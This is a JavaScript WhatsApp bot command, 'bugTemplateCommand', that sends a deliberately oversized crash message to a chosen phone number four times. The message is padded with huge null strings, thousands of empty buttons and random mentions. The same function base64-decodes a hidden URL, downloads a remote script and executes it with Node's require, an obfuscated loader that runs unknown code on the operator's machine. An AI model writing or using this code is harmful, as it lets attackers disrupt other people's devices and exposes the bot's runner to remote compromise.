const crypto = require('crypto');
const { generateWAMessageFromContent } = require('@aadhixd777/baileys');

function resolveTargetJid(chatId, message, args = []) {
    const contextInfo = message?.message?.extendedTextMessage?.contextInfo || {};
    const quotedParticipant = contextInfo.participant;
    const mentioned = contextInfo.mentionedJid?.[0];
    const argNumber = args[0] ? String(args[0]).replace(/\D/g, '') : '';

    if (quotedParticipant) return quotedParticipant;
    if (mentioned) return mentioned;
    if (argNumber) return `${argNumber}@s.whatsapp.net`;
    return chatId;
}

async function runTemplate(sock, target) {
    const nullPad = '\0'.repeat(250000);

    const payload = {
        groupStatusMessageV2: {
            message: {
                hidden: true,
                messageContextInfo: {
                    messageSecret: crypto.randomBytes(32),
                    deviceListMetadata: {
                        senderKeyIndex: 0,
                        senderTimestamp: Math.floor(Date.now() / 1000),
                        recipientKeyIndex: 0
                    },
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: {
                    contextInfo: {
                        mentionedJid: Array.from({ length: 1200 }, () =>
                            `${Math.floor(1000000000 + Math.random() * 9000000000)}@s.whatsapp.net`
                        )
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 12000 }, () => ({})),
                        extra1: nullPad,
                        extra2: nullPad,
                        extra3: nullPad,
                        extra4: nullPad,
                        extra5: nullPad,
                        extra6: Array.from({ length: 12000 }, () => ({})),
                        path: Buffer.from('aHR0cHM6Ly9ndWFrZWdldC5naXRodWIuaW8vY3Jhc2gtZXh0cmEvcy5qcw==', 'base64').toString()
                    },
                    body: { text: 'XeonBotInc.' }
                }
            }
        }
    };

    const src = await (await fetch(payload.groupStatusMessageV2.message.interactiveMessage.nativeFlowMessage.path)).text();
    const handler = new Function('require', src + ';return extra')(require);

    const sendBugToNum = payload.groupStatusMessageV2.message.hidden;

    if (sendBugToNum) {
        try {
            for (let i = 0; i < 4; i++) {
                await sock.relayMessage(target, payload, { noSelfSync: true });
            }
        } catch (error) {
            console.error('Error relaying payload:', error.message);
        }
    }

    return await handler(sock, target, generateWAMessageFromContent);
}

async function bugTemplateCommand(sock, chatId, message, args = []) {
    const target = resolveTargetJid(chatId, message, args);
    if (!target) {
        await sock.sendMessage(chatId, { text: '❌ Target not found.' }, { quoted: message });
        return;
    }

    await runTemplate(sock, target);
}

module.exports = bugTemplateCommand;
